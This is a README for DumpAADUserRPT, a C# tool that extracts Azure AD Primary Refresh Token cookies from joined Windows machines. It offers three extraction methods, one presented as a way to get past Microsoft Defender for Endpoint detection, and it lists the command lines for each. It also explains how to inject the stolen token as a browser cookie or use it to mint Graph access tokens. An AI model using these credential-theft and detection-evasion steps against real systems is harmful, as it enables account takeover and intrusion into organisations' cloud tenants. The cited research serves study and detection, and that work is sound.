# DumpAADUserRPT
DumpAADUserRPT is C# implementation of Get-AADIntUserPRTToken from [AADInternals](https://github.com/Gerenios/AADInternals) which obtain Primary Refresh Token, cookie "x-ms-RefreshTokenCredential", from Azure AD joined or Hybrid joined computer that can be used with SSO and Azure AD.

Since October 2020, it is no longer possible to use a PRT cookie without a nonce. Thus, nonce must be request in the first place in order to request a PRT.

As suggested by [Henri](https://medium.com/falconforce/falconfriday-stealing-and-detecting-azure-prt-cookies-0xff18-96efce74ce63), Microsoft Defender for Endpoint (MDE) flagged the approach of obtaining the PRT cookie in the BrowserCore route which just starting the process, providing the nonce on stdin and receiving the PRT cookie on stdout. The detection could be overcome by simulating behaviour of Chrome extension that  create the two named pipes which Chrome also uses.

DumpAADUserRPT provides three ways to dump PRT:

- interact with BrowserCore.exe by [Dirk-jan](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- simulate behaviour of Chrome extension "Windows Accounts" 
- invokes the MicrosoftAccountTokenProvider through COM by [Lee Christensen](https://bloodhoundenterprise.io/blog/2020/07/14/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso/)

## Usage

```shell
cmd> .\DumpAADUserPRT.exe print_help
DumpAADUserPRT
More info: https://github.com/Hagrid29/DumpAADUserRPT
Options:
Generate nonce:
        DumpAADUserRPT.exe get_nonce
Dump PRT by sending request as stdin to BrowserCore:
        DumpAADUserRPT.exe get_token [nonce <nonce>]
Dump PRT by copying the behaviour of Chrome extension:
        DumpAADUserRPT.exe get_token ChromeExtension [nonce <nonce>] [pause <second>]
Dump PRT by interacting with COM object:
        DumpAADUserRPT.exe get_token TokenProvider [nonce <nonce>]
Print AAD info:
        DumpAADUserRPT.exe check_aad
```
Request  nonce
```shell
cmd> .\DumpAADUserPRT.exe get_nonce
```
Request PRT by interacting with BrowserCore
```shell
cmd> .\DumpAADUserPRT.exe get_token
```
Request PRT by interacting with BrowserCore and supplying with nonce
```shell
cmd> .\DumpAADUserPRT.exe get_token nonce xxxxx
```
Request PRT by simulating behaviour of Chrome extension and executing BrowserCore accordingly 
```shell
cmd> .\DumpAADUserPRT.exe get_token ChromeExtension
```
Simulate behaviour of Chrome extension that open up named pipes which last for 60 seconds only. Require manually execute BrowserCore to obtain PRT.
```shell
cmd> .\DumpAADUserPRT.exe get_token ChromeExtension pause 60
```
Request PRT by interacting with COM object
```shell
cmd> .\DumpAADUserPRT.exe get_token TokenProvider
```
Print AAD information such as device join type, tenat name, user email
```shell
cmd> .\DumpAADUserPRT.exe check_aad
```
## Use Cases of PRT
#### Use as cookie in browser
1. Open a browser and visit https://login.microsoftonline.com/
2. Insert cookie named x-ms-RefreshTokenCredential and set the value as PRT
3. Refresh the page

#### Generate AAD Graph access token
1. Import AADInternal
2. Generate AAD Graph access token by supplying PRT
```powershell
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```

## References

* https://github.com/Gerenios/AADInternals
* https://bloodhoundenterprise.io/blog/2020/07/14/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso/
* https://medium.com/falconforce/falconfriday-stealing-and-detecting-azure-prt-cookies-0xff18-96efce74ce63
* https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/





